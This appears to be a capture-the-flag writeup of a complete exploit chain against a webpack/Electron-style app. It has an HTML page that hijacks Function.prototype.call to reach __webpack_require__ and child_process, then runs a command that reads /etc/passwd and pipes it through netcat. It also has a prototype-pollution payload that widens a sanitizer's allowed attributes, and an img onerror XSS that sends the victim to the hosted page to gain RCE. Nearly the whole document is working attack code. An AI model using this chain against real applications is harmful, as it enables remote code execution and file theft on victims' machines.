## Writeup

1. Host the below HTML file

```

<html>

<body>

    <h1>Leak Internal module</h1>
<script>
    const originalCall =  Function.prototype.call

    Function.prototype.call = function(... args){ 
    
        console.log(args)
    if( args[3] && args[3].name === '__webpack_require__'){
    
      //console.log(args)
      window.__test= args[3]
      
      args[3]("module")._load("child_process").exec("cat /etc/passwd | nc localhost 4445")
    
    }
    return originalCall.apply(this,args) 
    
    }
    

</script>

</body>

</html>


```

2. Use the below payload for gaining the RCE
keyword: __proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
append: <img src=1 onerror="document.location='<your html hosted file link>'">

